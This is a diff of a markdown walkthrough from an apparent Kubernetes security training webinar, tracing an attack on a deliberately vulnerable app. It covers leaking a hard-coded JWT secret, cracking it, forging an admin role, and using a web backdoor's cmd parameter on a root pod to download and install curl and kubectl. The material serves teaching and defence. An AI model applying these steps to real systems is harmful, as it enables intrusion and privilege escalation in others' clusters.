@@ -33,9 +33,8 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
     - architecture issue: symmetric algorithm (HS256 not RS256) => both services (the one that generates and another that checks the token) use the same secret and therefore *both can issue a new JWT*
 
 6. crack or leak the secret `secret123`:
-    - leaked through the K8s configuration (secret mount to the env var `SECRET_KEY` is hard-coded in the manifest): [dashboard link](http://dashboard.seck8s.slurm.io/clusters/local/namespaces/vulnerable-app/deployments/images-api)
-    <!-- TODO: save permalink below -->
-    - since the manifests are version-controlled, can be found in the Git commit history (`git blame`): [github link](https://github.com/Slurmio/webinar-seck8s/blob/main/03-application-security/vulnerable-app/images-api/deploy/images-api.yaml#L23) (*vulnerability: [Hard-Coded Credentials](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)*. Remember: source code is not secret!)
+    - leaked through the K8s configuration (secret mount to the env var `SECRET_KEY` is hard-coded in the manifest): [dashboard auth-api](http://dashboard.seck8s.slurm.io/clusters/local/namespaces/vulnerable-app/deployments/auth-api), [dashboard images-api](http://dashboard.seck8s.slurm.io/clusters/local/namespaces/vulnerable-app/deployments/images-api)
+    - since the manifests are version-controlled, can be found in the Git commit history (`git blame`): [github link](https://github.com/Slurmio/webinar-seck8s/blob/98bab96647708ab5368b5b51ccdf96dd2071894e/03-application-security/vulnerable-app/images-api/deploy/images-api.yaml#L22) (*vulnerability: [Hard-Coded Credentials](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)*. Remember: source code is not secret!)
     - the secret is weak therefore very easy to crack - in minutes with the tool [lmammino/jwt-cracker](https://github.com/lmammino/jwt-cracker) (*vulnerability: Weak Secret*)
 
 7. escalate provileges by changing the `"role": "user"` to `"role": "admin"` in the JWT payload (*vulnerability: [Broken User Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)*)
@@ -75,6 +74,7 @@ Application vulnerabilities can bring wide range of different *attack entrypoint
 
 9. use the backdoor to install `kubectl` (note again: the pod is running Ubuntu as `root`) by navigating to `http://images.vulnerable-app.seck8s.slurm.io/?cmd=...`:
     - `kubectl get all`
+    - install curl: `apt-get update`, `apt-get -y install curl`
     - install kubectl ([instruction](http://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)):
         - `curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"`
         - `install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl`
